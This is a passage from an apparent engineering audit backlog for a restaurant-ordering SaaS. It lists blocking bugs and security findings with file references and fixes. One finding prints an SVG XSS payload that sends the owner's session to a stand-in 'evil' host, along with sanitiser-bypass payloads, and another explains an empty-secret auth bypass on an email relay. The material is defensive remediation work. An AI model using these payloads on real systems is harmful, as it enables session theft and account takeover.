(`campaign-wizard-dialog.tsx:181`). But there is **no `crons.ts` in
`apps/reference/convex` or `apps/themes/convex`** — only `apps/site` has one — and no
`ctx.scheduler.runAt` references a campaign.

**Fix.** Add `convex/crons.ts` with an internal action running every minute that lists
`listByStatus({ status: "scheduled" })` filtered on `scheduledAt <= now` and triggers
the send. The same file will serve P0-26 (Auto Blog) and KDS retention (P0-13).

**Done when.** A campaign scheduled for T+2 minutes sends on its own.

---

## P0-20 · "Relancer" re-sends the campaign from the first subscriber
**List:** P0 blockers · **Priority:** urgent · **Parent:** #109

**Problem.** A 1,000-subscriber campaign, paused around 400 to fix a typo, then
"Relancer": subscribers 1–400 receive the email **a second time**. Real customers,
real complaints, real SES reputation damage.

**Where.** `packages/admin/src/pages/email/campaigns/email-campaigns-page.tsx:470-477`
calls `handleSend` → `emailCampaignActions.send`, which accepts status `paused`
(`apps/reference/convex/emailCampaignActions.ts:72`) and then iterates `subscribers`
from index 0 (`:123`) with **no cursor, no per-subscriber sent check, no checkpoint**.
`markSending` likewise allows `paused` (`emailCampaigns.ts:211`). The file even carries
a comment at `:453` saying a `sent` campaign must never be re-sent.

**Fix.** Before each send, check for an existing `emailEvents` row of type `sent` for
`(campaignId, subscriberId)` and skip; or persist a `lastSentSubscriberIndex` cursor on
the campaign and resume from it.

**Done when.** Pause then resume on a seeded list sends no duplicates.

---

## P0-21 · Permanent bounces are retried twice before suppression
**List:** P0 blockers · **Priority:** urgent · **Parent:** #109

**Problem.** On a list with 5% dead addresses — normal for one built over two years —
every permanent bounce is mailed three times. That is the exact pattern that triggers
an AWS sending pause; the published threshold is a 5% bounce rate.

**Where.** `packages/convex-functions/src/emailSubscribers.ts:234-246` — `markBounced`
only sets `status: "bounced"` at `newCount >= 3`. The webhook
(`apps/reference/convex/emailHttpHandlers.ts:268-285`) never reads
`notification.bounce.bounceType`, even though the type is declared at `:153-156`.

**Fix.** In the webhook, suppress immediately when
`bounce.bounceType === "Permanent"`; keep the 3-strike counter for `Transient` only.

**Done when.** A simulated permanent bounce flips the subscriber to `bounced` on the
first event.

**RESOLVED.** `markBounced` takes an optional `bounceType`; `Permanent` suppresses on
the first event, `Transient` and `Undetermined` keep the three-strike counter, and a
bounce no longer overwrites an `unsubscribed` or `complained` status — a spam report is
the one a regulator asks about. The webhook normalises the value through
`normalizeBounceType` before forwarding it: the validator is a closed union and the
dispatch sits inside a `catch` that only logs, so an unrecognised classification would
otherwise have been swallowed and the bounce lost entirely — worse than the behaviour it
replaced. Guarded by seven unit tests and `apps/*/tests/convex/ses-bounce.test.ts`, which
drives the real `POST /webhooks/ses` with a genuinely RSA-signed SNS envelope.

---

## P0-22 · The SES Configuration Set is hard-coded
**List:** P0 blockers · **Priority:** urgent · **Parent:** #109

**Problem.** On a client's own AWS account that configuration set does not exist. Every
`SendEmailCommand` throws `ConfigurationSetDoesNotExist`, the per-subscriber `catch`
swallows it to `console.error` (`emailCampaignActions.ts:181-183`), `sentCount` stays 0,
`markSent` runs anyway (`:187`), and the UI toasts "Campagne envoyée (0/342 emails)".
The owner believes it is a recipient-side problem.

**Where.** `apps/reference/convex/emailCampaignActions.ts:142` and `:255` hard-code
`ConfigurationSetName: "beindigital-email-tracking"`. Meanwhile
`AWS_SES_CONFIGURATION_SET` is declared in the env schema
(`packages/core/src/env/schemas.ts:66`) and in all three `.env.example` files — and
read **nowhere**.

**Fix.** Read `process.env.AWS_SES_CONFIGURATION_SET` and omit the field when unset;
abort the loop with a thrown error after N consecutive failures instead of marking the
campaign `sent` with 0 delivered.

**Done when.** A send without a valid configuration set fails loudly and leaves the
campaign in a non-`sent` state.

**RESOLVED.** All three sites in both apps read `AWS_SES_CONFIGURATION_SET` through
`resolveConfigurationSet`, and omit the field when it is unset or blank. Five consecutive
SES refusals abort the batch: it pauses the campaign and throws, so the cursor is
preserved, the chain halts, and "Relancer" resumes the aborted page once the account is
fixed. `paused` rather than `sending` deliberately — the admin renders `sending` as
"En cours", which still claims a send is progressing when it has stopped. The counter is
reset by every send that works, so a list with scattered bad addresses still goes out in
full.

---

## P0-23 · Catalogue GPT translation is dead — three independent blockers
**List:** P0 blockers · **Priority:** urgent · **Parent:** #95

**Problem.** The owner adds Spanish, saves 60 products, waits. No GPT call is ever
made, no error surfaces, no product is ever translated. Sold as "~$0.001 per product".

**Where.** Three cumulative blockers:
1. **The schema has none of the fields.**
   `packages/convex-schema/src/tables/catalog.ts:29-119` declares no `translations`, no
   `pendingTranslation`, no `scheduledTranslationJobId` — yet
   `packages/convex-functions/src/autoTranslate.ts:279-280` writes them. `defineSchema`
   is called with no options, so validation is on and the patch is rejected. Same for
   `translationQuota`, absent from `storesTable`.
2. **`fetch` inside a mutation.** `apps/reference/convex/autoTranslate.ts:19,21`
   registers `executeTranslation` and `batchChunk` as `internalMutation`, and both call
   `translateViaGPT` → `fetch()` (`autoTranslate.ts:60`). Convex forbids this. The
   codebase knows: `cmsAutoTranslate.ts:10` documents the query → fetch → mutation
   split, and `autoTranslate.ts:141-144` notes an `internalAction` is required.
3. **Zero callers.** `scheduleTranslation` carries the comment "Call this from
   product/category/menu mutations" (`apps/reference/convex/autoTranslate.ts:47-48`) and
   is called nowhere. `products.ts`, `categories.ts` and `menus.ts` contain the string
   "translat" zero times. `batchChunk` only ever schedules itself, so nothing starts chunk 0.

**Fix.** Add the fields to the catalogue tables and `translationQuota` to `storesTable`;
re-register `executeTranslation` / `batchChunk` as `internalAction`s orchestrating
internal query → fetch → internal mutation, following `cmsAutoTranslate.ts`; call
`scheduleTranslation` from `products.create/update`, `categories.create/update`,
`menus.create/update`.

**Done when.** Creating a product with a second active language produces a translation
visible on the storefront.

---

## P0-24 · Switching language changes nothing the customer can read
**List:** P0 blockers · **Priority:** urgent · **Parent:** #95

**Problem.** A customer picks Español on a live storefront. The page reloads. Menu,
buttons, product names, cart — all still French. Only `<html lang="es">` changed.

**Where.** `apps/reference/components/storefront/language-selector-dropdown.tsx:43-47`
writes the cookie plus localStorage and reloads. On reload nothing consumes it:
- `loadAllStaticStrings` / `getStaticStrings` (`apps/reference/lib/i18n/index.ts:31,68`)
  are imported by **no component**
- `setOverrides` and `setStaticStrings` (`packages/restaurant/src/stores/language.ts:117-118`)
  have **zero call sites**; `initialize` has one,
  `apps/themes/components/admin/AdminLanguageSwitcher.tsx:51`, itself never mounted
- so `locale` stays at its literal `'fr'` (`:113`) and `isReady` at `false` (`:116`),
  which also makes `components/storefront/LanguageSwitcher.tsx:24` return `null` forever
- manual UI overrides are read only by the admin editor
- product names have no translated field (see P0-23)

**Fix.** Mount an initialiser in the storefront shell calling `initialize()` +
`setOverrides(getUIOverrides)` + `setStaticStrings(await loadAllStaticStrings(codes))`,
and expose a `t()` accessor — override → static JSON → default locale → key — actually
used by the components.

**Done when.** Switching language changes the menu and button text.

---

## P0-25 · The public blog is hard-coded demo content
**List:** P0 blockers · **Priority:** urgent · **Parent:** #112

**Problem.** The owner publishes three articles, opens their site, and finds six of
somebody else's — Unsplash photos, future dates ("12 Mars 2026"). All twelve card
links 404. Everything the Auto Blog generates lands in the same void.

**Where.** `apps/reference/app/(storefront)/blog/_components/BlogContent.tsx:18-90` —
a hard-coded `BLOG_POSTS` array. No storefront file calls
`api.blog.listPublishedArticles` (verified: every `api.blog` hit is under
`components/admin/blog/`). There is no `app/(storefront)/blog/[slug]/page.tsx` in
either app, while the cards link to `/blog/${post.slug}` (`:134`, `:197`).
The same three fake posts are duplicated in `menu/page.tsx:427-445` and
`_components/HomepageContent.tsx:56-60`.

**Fix.** Replace `BLOG_POSTS` with
`useQuery(api.blog.listPublishedArticles, { storeId })` and add
`app/(storefront)/blog/[slug]/page.tsx` backed by `getArticleBySlug`, with
`generateMetadata` and sanitisation at render.

**Done when.** An article published in the admin appears on `/blog` and its own page
returns 200.

---

## P0-26 · The Auto Blog has no scheduler
**List:** P0 blockers · **Priority:** urgent · **Parent:** #112

**Problem.** A €19–99/month subscription. The owner sets "weekly, Tuesday, 09:00,
auto-publish", saves — and no article is ever generated. Only the manual
"Generate with AI" button works.

**Where.** `packages/convex-schema/src/tables/autoBlog.ts:63-118` stores `isEnabled`,
`frequency`, `preferredWeekdays`, `preferredMonthDays`, `preferredHour`, `timezone`,
`approvalMode`; `blogAutoQueue` even has an index documented "Cron: find pending jobs
due for execution". Yet `grep cronJobs` across `apps/*/convex` and
`packages/convex-functions` returns **zero results**, and `blogAutoQueue` has no reader
or writer outside the schema.
`approvalMode: "auto_publish"` is validated against the plan
(`blogAutoGuards.ts:331`) and then read by nothing: `saveGeneratedArticleCore` →
`createArticleCore` always saves `status: "draft"` (`blog.ts:395`).
`tasks/auto-blog-spec.md:157-183` specifies two crons — neither exists.

**Fix.** Ship the two crons from spec §4.2 (`planAutoBlogJobs` hourly,
`executeAutoBlogQueue` every 5–15 min) and honour `approvalMode` in the generation
path. Otherwise remove the scheduling fields and the auto-publish option from the UI
and reposition the offer as manual on-demand generation — product decision, see LAUNCH-04.

**Done when.** A weekly configuration produces an article with no human action.

---

## P0-27 · Any customer account can store an XSS payload on the site's own origin
**List:** P0 blockers · **Priority:** urgent · **Parent:** #97

**Problem.** Full admin takeover of a restaurant by any self-registered storefront customer.

Scenario: the customer signs up, uploads an SVG containing
`<script>fetch('/api/auth/get-session').then(r=>r.text()).then(t=>fetch('https://evil/?d='+t))</script>`,
then sends the returned URL to the owner through the contact form. Opening it runs
script in the same origin as `/dashboard`, so the fetches carry the owner's session.

**Where.** `apps/reference/app/api/upload/route.ts:46` — the only gate is
`isAuthenticated()`, i.e. any Better Auth session, i.e. any storefront customer; the
`CUSTOMER` role has no `content:write` (`packages/core/src/auth/rbac.ts:246-251`).
`folder` is caller-supplied and `cms` is in `VALID_FOLDERS` (`:13`); `image/svg+xml` is
allowed for `cms`, `products`, `branding` and `stores`
(`packages/core/src/aws/types.ts:54,61,68-79`); `contentType` comes from the multipart
part header, so it is attacker-controlled; the object is written with
`ContentType: contentType` (`:115`) and the route returns
`/api/files/cms/<uuid>.svg` (`:121`) — **the application's own origin**.
`apps/reference/app/api/files/[...key]/route.ts:53` echoes `response.ContentType`
verbatim, with no auth and no CSP anywhere in the repo.

The Convex twin was already hardened with a role check
(`apps/reference/convex/storageUpload.ts:81-83`, comment: *"'Logged in' included every
customer account, so the check is by role"*) — the Next.js route was left behind.

The SVG sanitiser is bypassable anyway
(`packages/cms/src/sanitize/svgSanitizer.ts:31,34`): `EVENT_HANDLER_PATTERN` requires
whitespace before the handler, so `<svg/onload="…">` survives; and
`JAVASCRIPT_URI_PATTERN` sees neither `&#106;avascript:` nor
`<set attributeName="href" to="javascript:…">`. Both payloads were executed against
`sanitizeSvg` and came back unchanged.

**Fix.**
1. Replace `isAuthenticated()` with a `content:write` check.
2. Drop `image/svg+xml` from the allowed types, or route it through **DOMPurify in SVG
   mode** (not the current regex).
3. On `/api/files`, force `Content-Disposition: attachment` and an allowlisted
   `Content-Type` for anything that is not an image or video.
4. Add a CSP — there is none today.

**Done when.** A `CUSTOMER` account gets 403 from `/api/upload`, and a booby-trapped
SVG uploaded by an authorised account is served inert.

---

## P0-28 · `/contact` white-screens on every visit
**List:** P0 blockers · **Priority:** urgent · **Parent:** #96

**Problem.** The page is linked from the header on **every** storefront page. It throws
as soon as the query resolves, and there is no error boundary in the repo, so the
visitor gets Next's default error screen.

**Where.** `apps/reference/app/(storefront)/contact/_components/ContactContent.tsx:261`
```tsx
{store?.address ?? "123 Rue de la Gastronomie"}
```
`address` is a **required** `v.object({street, city, postalCode, country, latitude?, longitude?})`
(`packages/convex-schema/src/tables/stores.ts:13`). React throws
"Objects are not valid as a React child". Identical file in `apps/themes`.

Both neighbours are wrong too: `:263` reads `store?.city` and `:278`
`store?.openingHours`, neither of which exists on the document (they are `address.city`
and `hours`) — so both silently fall back to invented placeholders.

**Fix.** Compose the address from its fields, derive the hours rows from `store.hours`
(`{day:number, open, close, isClosed}`), and add `app/(storefront)/error.tsx` **and**
`app/(admin)/error.tsx` in both apps.

**Done when.** `/contact` shows the real address and hours, and an e2e covers the page.

---

## P0-29 · The cart conflates option variants of the same dish
**List:** P0 blockers · **Priority:** urgent · **Parent:** #111

**Problem.** The customer orders one pizza with extra cheese and one plain. They tap
"+" on the second: **both** go to 2, and the total silently doubles before checkout.
Clicking the bin on either removes both lines.

**Where.** `packages/restaurant/src/stores/cart.ts:79-96` — `removeItem(productId)`
filters and `updateQuantity(productId, quantity)` maps on `item.productId` alone, while
`addItem` (`:59`) uses `isSameItem` (product **+ options**, `services/cart.ts:86-103`)
and deliberately keeps separate lines. All eight call sites pass only the product id:
`app/(storefront)/cart/page.tsx:234,301,315,339` and
`components/storefront/cart-sheet.tsx:238,305,319,343` — whose React `key`
(`cart-sheet.tsx:179`) already includes the options.

Proven by test: `p1 + cheese` ×1 and `p1 + olives` ×1 then `updateQuantity('p1', 2)`
yields quantities `[2,2]` and `getItemCount() === 4`; `removeItem('p1')` empties the cart.

**Fix.** Assign a stable `lineId` in `addItem` (hash of `productId` + sorted option ids)
and key `removeItem` / `updateQuantity` on it. Update all eight call sites.

**Done when.** A regression test covers two variants of one product, plus an e2e
"add two configurations of a dish, open the cart at 375px".

---

## P0-30 · `apps/site` — customer billing data is publicly readable
**List:** P0 blockers · **Priority:** urgent · **Parent:** —

**Problem.** Anyone can read a customer's billing history from their email address,
**including the Stripe PDF links**, and the full commercial record from an `orderId`.

**Where.** Three public `query` functions with no checks, on a deployment whose URL
ships in the browser bundle (`NEXT_PUBLIC_CONVEX_URL`):
- `apps/site/convex/invoices.ts:86-96` — `getByEmail` takes an arbitrary email and
  returns up to 50 invoices including `invoicePdfUrl` and `hostedInvoiceUrl`
- `apps/site/convex/subscriptions.ts:89-99` — plan, status, Stripe ids
- `apps/site/convex/orders.ts:97-102` — `ctx.db.get(orderId)`, i.e. the whole document:
  email, first/last name, phone, restaurant name, city, **SIRET**, `amountCents`,
  `stripeSessionId`

Six lines below `orders.get`, the comment on `getCheckoutAccess` (`:104-112`) states
exactly the rule these break: *"Anything more (email, phone, SIRET, amount) would be
readable by anyone holding or guessing an id."*

**None of the three has a caller** in `app/`, `components/` or `lib/`.

**Fix.** Convert to `internalQuery`, or delete them. If a client area needs them later,
derive the email from the authenticated session — never from an argument.

**Done when.** `grep -n "^export const getByEmail = query"` returns nothing in
`apps/site/convex`.

---

## P0-31 · `apps/site` — with no Stripe key, everything is sold for free
**List:** P0 blockers · **Priority:** urgent · **Parent:** —

**Problem.** A key forgotten, cleared during the test→live swap, or mistyped on the
production deployment, and **every visitor who submits the form gets a `paid` order**:
founder seats are consumed (`countFoundersSold`, `orders.ts:145-166`), confirmation
emails go out, the ops console reports revenue — with no money taken. Nothing in the UI
distinguishes it: `getCheckoutAccess` only asks `status === "paid"`.

**Where.** `apps/site/convex/stripe.ts:86-90`
```ts
function getStripe(): Stripe | null {
  const key = process.env.STRIPE_SECRET_KEY
  if (!key) return null
  return new Stripe(key)
}
```
then `:235-276`
```ts
if (!stripe) {
  console.log(`[TEST MODE] Order ${orderId} created … — skipping Stripe`)
  await ctx.runMutation(internal.orders.updateStatus, {
    orderId, status: "paid", paymentMethod: "card",
  })
}
```
No environment guard. Same shape in `stripeConnect.ts:34-44`, which fabricates an
`acct_test_…` and sets `stripeConnectStatus: "active"`.

**Fix.** Gate the branch on an explicit `BEYOURS_TEST_CHECKOUT === "true"`, and throw a
loud error when `STRIPE_SECRET_KEY` is absent without it. Same in `stripeConnect.ts`.

**Done when.** Removing `STRIPE_SECRET_KEY` from a deployment makes checkout fail
instead of succeeding for free.

---

## P0-32 · The environment fail-fast validates nothing a client must configure
**List:** P0 blockers · **Priority:** urgent · **Parent:** #102

**Problem.** The site boots printing "All environment variables validated successfully",
then fails at the client one feature at a time: Stripe not configured, encryption key
missing, S3 bucket missing, password reset silently doing nothing. Every failure lands
on the restaurant owner instead of on deploy.

**Where.** `packages/core/src/env/schemas.ts:41-96` — all **28** `siteEnvSchema` fields
are `opt()`. Only `AWS_REGION`, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and
`OPENAI_API_KEY` are required. Worse, `opt()` (`:4-5`) maps `''` → `undefined`, and
every `.env.example` ships these keys empty — so copying the template and filling
nothing still validates.

Variables read at runtime and **absent from the schema** (sample):
| Variable | Read at | Consequence when unset |
|---|---|---|
| `AWS_S3_PUBLIC_BASE_URL` | `imageToProduct.ts:52` +15 | **Every** image 403s on a private bucket |
| `ADMIN_BOOTSTRAP_TOKEN` | `userProfiles.ts:120` | No first admin can be appointed |
| `NEXT_PUBLIC_SITE_URL` | `lib/seo.ts:40`, `sitemap.ts:17` | Site indexed under the wrong domain |
| `BID_APP_URL` | `gameEmail.ts:117`, `bidSubscription.ts:39` | Dead links in customer email |
| `UNSPLASH_ACCESS_KEY` | `unsplashSearch.ts:38` | CMS image search returns nothing |
| `AUTH_ALLOW_UNVERIFIED_EMAIL` | `auth.ts:30` | Undiscoverable by the operator |

`EMAIL_API_SECRET`, `CONVEX_URL` and `AUTH_SECRET` are documented and **never read**;
`UBER_DIRECT_WEBHOOK_SECRET` is declared and read by nobody.
`apps/site` has **no `instrumentation.ts`**: zero validation on beyours.fr.

**Fix.** Split into `siteEnvRequiredSchema` (`NEXT_PUBLIC_CONVEX_URL`,
`CONVEX_SITE_URL`, `SITE_URL`, `BETTER_AUTH_SECRET` min 32, `ENCRYPTION_KEY`,
`AWS_S3_BUCKET_NAME`, `AWS_S3_PUBLIC_BASE_URL`, `AWS_SES_FROM_EMAIL`) plus a
feature-gated optional tier; make `opt()` reject `''` on required fields; declare the
missing variables; add `instrumentation.ts` to `apps/site`.

**Done when.** An unconfigured clone refuses to boot, naming exactly what is missing.

---

## P0-33 · An empty `BETTER_AUTH_SECRET` opens an email relay
**List:** P0 blockers · **Priority:** urgent · **Parent:** #102

**Problem.** Anyone can POST to `/api/email/send` with any recipient, subject, body and
`resetLink` — from the restaurant's SES-verified domain. Phishing under the client's brand.

**Where.** `packages/core/src/aws/ses/route-handler.ts:80-88`
```ts
const tokenBuf = Buffer.from(token)
const secretBuf = Buffer.from(config.secret)
if (tokenBuf.byteLength !== secretBuf.byteLength || !timingSafeEqual(tokenBuf, secretBuf)) {
  return Response.json({ error: 'Unauthorized' }, { status: 401 })
}
```
**Verified by execution:** with `secret = ""` and an empty token, the lengths are
`0 === 0` and `timingSafeEqual(<empty>, <empty>)` returns `true` → **accepted**.
`apps/reference/app/api/email/send/route.ts:4` passes
`process.env.BETTER_AUTH_SECRET!`, `BETTER_AUTH_SECRET=` ships empty in the
`.env.example` files, and `opt()` accepts the empty string.
(With the variable genuinely unset, `Buffer.from(undefined)` throws inside the `try`
→ 500, so that case fails closed. Only the empty-string case is exploitable.)
`resetLink` is validated only by `z.string().url()` (`:21`), with no domain check.

**Fix.** Reject any secret shorter than 32 bytes at handler construction; use a
dedicated `EMAIL_API_SECRET` (already documented, never read); validate `resetLink`'s
origin against `SITE_URL`.

**Done when.** An empty secret fails startup, and an empty bearer token gets 401.

---

## P0-34 · Two contradictory S3 bucket policies in the same product
**List:** P0 blockers · **Priority:** urgent · **Parent:** #97

**Problem.** Whichever policy the operator picks, half the product breaks. Private
bucket → every CMS, blog and product image 403s with no error anywhere. Public bucket →
every uploaded file is world-readable by URL with no auth.

**Where.** Two opposite assumptions, each commented:
- `apps/reference/convex/storageUpload.ts:119-121` builds
  `https://<bucket>.s3.<region>.amazonaws.com/<key>` — *"Public URL (bucket policy
  allows public reads)"*
- `apps/reference/app/api/upload/route.ts:120-121` returns `/api/files/<key>` —
  *"Return a proxy URL since the S3 bucket is not publicly accessible"*

Sixteen Convex files build the direct form (`cmsMediaConfirmUpload`, `cmsMediaProcess`,
`cmsSvgUpload`, `cmsSeed`, `blogAutoGenerate`, `blogImageGenerate`, `imageToProduct`,
`storageUpload` × 2 apps), and `next.config.ts:36-39` allowlists
`**.s3.eu-west-3.amazonaws.com` in `images.remotePatterns`.

Already tracked as **S3-11** in `tasks/sprint-durcissement-reference.md`, not started.

**Fix.** Pick one (product decision — see LAUNCH-05). Recommended: private bucket,
delete `buildPublicUrl` from all 16 files, route everything through `/api/files` once it
is authenticated (P0-27), drop the S3 host from `remotePatterns`, and make
`AWS_S3_PUBLIC_BASE_URL` required if going the CloudFront route instead.

**Done when.** A CMS-uploaded image renders on the storefront of a fresh deployment, and
an unreferenced object is not anonymously readable.

---

## P0-35 · Gamification is absent from the product being sold
**List:** P0 blockers · **Priority:** urgent · **Parent:** #107

**Problem.** `apps/themes` is the template cloned for every paying client. There it
shows **five "Coming soon" menu entries** and a placeholder player page. The owner sees
Games & Prizes, QR Codes, Actions, Winners and Settings in the sidebar — all dead. And
the backend is complete: `apps/themes/convex/gameEmail.ts:119` emails the winner a
`/game/prize/{code}` link that **404s**.

**Where.**
| Element | `apps/reference` | `apps/themes` |
|---|---|---|
| `dashboard/games/{catalog,qr-codes,actions,winners,settings}` | real pages | `<ComingSoon/>` |
| `app/game/[qrCodeId]/_components/GameContent.tsx` | 424 lines | **28-line placeholder** |
| `_components/` (wheel, scratch, cooldown, ticket…) | 11 components | **0** |
| `lib/game/` (wheel, fingerprint, confetti, haptics, sounds) | 8 files | **absent** |
| `app/game/prize/[code]` | present | **absent** |

The string shown to the end customer is literally
`"Gamification flow will be implemented here."`
(`apps/themes/app/game/[qrCodeId]/_components/GameContent.tsx:23`).

**Root cause.** The game components were written inside the test-bench app rather than
a package: `grep -l "wheel\|scratch" packages/ui/src packages/restaurant/src` returns
nothing. The template could never inherit them.

**Fix, in two steps.**
1. *Immediate, one line per file.* Replace the five `ComingSoon` pages with the already
   exported imports: `GameCatalogPage`, `GameQrCodesPage`, `GameActionsPage`,
   `GameWinnersPage` (`packages/admin/src/index.ts:75-79`).
2. *Structural.* Lift `apps/reference/lib/game/` and the 11 components into a package
   (`packages/ui`, or a new `packages/game`), then render them from both apps. Copy
   `app/game/prize/[code]/` into `apps/themes` and add `qrcode` + `@types/qrcode` to its
   `package.json`.
3. Delete `apps/themes/components/admin/games/GamesContent.tsx` (604 lines, no importer).

**Done when.** The scan → actions → play → win → ticket → staff validation flow passes
end to end **in `apps/themes`**.

---
---

# `TECH` — 12 grouped P1 cards

Each card groups the P1 findings of one domain. The whole card is the issue body;
every bullet becomes a checklist item in ClickUp.

---

## TECH-01 · Promotions and discounts — four sold features, none applied
**Priority:** high · **Parent:** #108

- [ ] **Product/category scope ignored.** `promotionDiscount.ts:170-187` computes
  `Math.round(subtotal × rate / 100)` over the **whole** basket. `promotion.scope`,
  `targetProductIds` and `targetCategoryIds` are collected
  (`promotion-form.tsx:250-269`), stored (`tables/promotions.ts:46-47`) and read by no
  pricing code. "−20% on pizzas" over 1 pizza (€12) + 8 drinks (€24) discounts €7.20
  instead of €2.40.
  → pass the verified line items into `resolvePromotionDiscount` and compute over the
  eligible subset only.
- [ ] **Happy hour never enforced.** `promotion.scheduling.{activeDays,activeTimeFrom,activeTimeTo}`
  (`tables/promotions.ts:57-59`) is rendered in the promotions table
  (`promotions-page.tsx:133-138`) and read by nothing. A "Mon–Fri 17:00–19:00" discount
  applies on Sunday at 21:00.
  → add an `activeSchedule` check with a `not_scheduled` rejection reason, in
  `globalSettings.timezone`.
- [ ] **Automatic promotions are dead.** `promotions.listActiveAuto`
  (`promotions.ts:80-91`) is publicly exported and has **zero callers**.
  `orders.create` only ever reads `args.promotionId`.
  → either apply them server-side, or remove the "automatic offer" trigger from the form.
- [ ] **`free_delivery`: the screen says €26.90, the card is charged €22.00.**
  `checkout/page.tsx:144-147` hard-codes `discountAmount = 0`; the server sets
  `discount = deliveryFee` (`promotionDiscount.ts:200-206`).
  → mirror the discount client-side, or return it from a server query.
- [ ] **Fixed discount larger than the basket displays an amount never granted.**
  Client: uncapped `discountValue` (`checkout/page.tsx:142-143`); server: clamped to
  `subtotal + tax + delivery` (`promotionDiscount.ts:222`). −€50 shown on a €22 order.
- [ ] **The discount line is missing from both order views.**
  `order/[orderId]/page.tsx:231-250` and `order-detail-page.tsx:393-410` never render
  `order.discountAmount`: the receipt does not add up.

---

## TECH-02 · Orders — lifecycle, idempotence and cash
**Priority:** high · **Parent:** #104

- [ ] **No idempotence on order creation.** `orders.create` has no dedup key, unlike
  `createFromWebhook` (`orders.ts:717-730`). The button re-enables in `finally`
  (`checkout/page.tsx:475-477`) while the redirect is in flight, and the cart survives
  a Back navigation → two orders, two tickets, two promotion-usage increments.
  → accept a client `idempotencyKey`, index it with `storeId`, return the existing
  order on replay.
- [ ] **A cash order can never be marked paid.** `internalUpdatePaymentStatus`
  (`apps/reference/convex/orders.ts:134-151`) is reachable only from the provider
  actions. No `payments` row is ever created for cash: the "Espèces" filter
  (`payments-page.tsx:131`) can never match, and there is nothing to reconcile or refund.
  → a permissioned `markCashPaid` mutation writing a `provider: "cash"` payment.
- [ ] **Cancelling an order leaves its kitchen ticket live.** `updateStatus` never
  touches `kitchenTickets`; the sync is one-way (`kitchenTickets.ts:230-236`). The KDS
  keeps showing it and `/track/[token]` says "In preparation" — the cancelled branch
  (`track/[token]/page.tsx:75`) is unreachable from an order cancellation.
- [ ] **Minimum order amount and delivery radius are never enforced.**
  `globalSettings.minimumOrderAmount` (`globalSettings.ts:45`) and `delivery.radius`
  (`:50`) are configurable and read by nobody. A €3.30 order passes against a €15
  minimum; a 40 km delivery is accepted.
- [ ] **Percentage fee mode without Uber Direct makes delivery checkout impossible.**
  `delivery-tab.tsx:95-116` does not gate the option; `orders.create:379-383` then
  throws "Un devis de livraison est requis", which the customer cannot satisfy.

---

## TECH-03 · Payments — binding, deduplication and OAuth
**Priority:** high · **Parent:** #106

- [ ] **Stripe settlement is not bound to amount or currency.**
  `apps/reference/convex/stripe.ts:84-163` — the comment at `:83` claims
  `assertSettlesOrder` binds session to order, currency and amount; grep finds it only
  at `sumup.ts:167` and `paypal.ts:235`. `verifyCheckoutSession` is a public action
  taking any `sessionId` and records `amount: rawSession.amount_total ?? order.total`
  with no comparison. Stripe is the default provider.
  → extend `PaymentProvider` (`paymentSettlement.ts:21`) with `"stripe"` and call
  `assertSettlesOrder` before `:122`, and in `stripeWebhook.ts`.
- [ ] **No event deduplication — duplicate payment rows.** The return page
  (`stripe.ts:120-145`) and the webhook (`stripeWebhook.ts:38-67`) both do
  read-then-write across separate invocations; `payments.internalCreate` inserts
  unconditionally (`payments.ts:64-73`) while the `by_externalId` index exists
  (`tables/payments.ts:73`) and is never queried. One charge, two €48 rows, each fully
  refundable.
  → upsert on `(orderId, externalId)` plus a processed-events table like
  `apps/site/convex/stripeEvents.ts`.
- [ ] **SumUp OAuth callback has no CSRF state check.** `oauthConnect.ts:161-175`
  generates a `state` and **never persists it**; `oauthCallbackHandlers.ts:158-201`
  never reads it. The infrastructure exists and is used correctly by Uber Eats
  (`uberEatsOAuth.ts:65`, `uberEatsOAuthHttp.ts:31-45`). An injected authorization code
  overwrites the `paymentConnections` row and routes card payments into a third party's
  SumUp account.
- [ ] **Stripe Connect is a shell.** `oauthConnect.ts:110-148` creates and stores a
  connected account; no charge path reads it (`stripe.ts:41-43` builds the client from
  the platform key, with no `stripeAccount`, `on_behalf_of` or `transfer_data`). The
  owner sees "stripe connected" and the money goes elsewhere.
- [ ] **A charge taken while the webhook is missed is lost.**
  `stripeWebhookVerify.ts:37-50` only handles `checkout.session.completed`;
  `payment_intent.succeeded` and `charge.refunded` are swallowed. No reconciliation job.
- [ ] **A partially refunded payment cannot be refunded again from the UI.**
  `payments-page.tsx:166-169` requires `status === "succeeded"` while `planRefund`
  accepts `partially_refunded` (`refundPolicy.ts:66`).

---

## TECH-04 · Delivery integrations — money, statuses and volume
**Priority:** high · **Parent:** #103 · **9/9 closed**

All nine were verified by execution before being fixed, and each fix is held by a test that
was proven red against the unfixed code.

- [x] **Uber line items stored at ~2.1x their real price.** Measured 2.209x on a
  quantity-2 line. `uberEatsWebhook.ts` fed `item.totalPrice` — already
  `(unitPrice + modifiers) x quantity` — into the slot `createFromWebhook` treats as a
  unit price and multiplies again. Now `toWebhookOrderItems` passes `unitPrice`, named
  for what it is so the next such mistake is a type error.
  Two further money defects surfaced while testing the seam:
  `createFromWebhook` added modifiers **once** rather than per unit, so the same basket
  was cheaper through a platform than through the website — and the existing test
  asserted the wrong total, holding the bug in place. It has been rewritten. A modifier's
  own `quantity` was dropped at the boundary, so a "double cheese" was charged once. The
  line arithmetic now also clamps the way `verifyOrderLine` does (no negative line from an
  over-large removal discount, integer quantities, `MAX_LINE_QUANTITY`).
- [x] **Deliveroo status vocabulary does not match the API.** Confirmed against Deliveroo's
  published contract: it sends only `pending`, `placed`, `accepted`, `confirmed`,
  `rejected`, `canceled` — **one l**. The switch matched `cancelled`, had no `confirmed`
  case, accepted four prep *stages* it never receives, and defaulted to `pending`, dragging
  live orders backwards. Unknown statuses now return `null` and the caller leaves the order
  alone.
- [x] **A `denied` status 500s the webhook into a retry loop.** The cast that hid it lived in
  the webhook, not `orders.ts`. The whole `eats.order.status_update` branch that carried the
  value has been deleted — Uber never sent that event — so no Uber path applies a mapped
  status any more. The landmine itself (`UBER_EATS_STATUS_MAP.DENIED = "denied"`, a value our
  eight-status table cannot store) is pinned by a test at source, so the next person to write
  `status: unified.status` is warned rather than paged.
- [x] **Every delivery webhook full-scans `orders`.** Both lookups now read through
  `by_external_order`, which existed and was used by nothing. The index is on
  `externalOrderId` alone while the queries also match on `source`, so this is covered
  against the real Convex engine rather than a stub: the same external id from two platforms
  stays two orders, and an update reaches the right one.
- [x] **Item availability (86'ing) and store pause are not wired.** The Deliveroo path was
  aimed at an endpoint that matches nothing documented, with the wrong body shape, through
  the wrong API base, sending lowercase statuses against an uppercase enum. Uber's
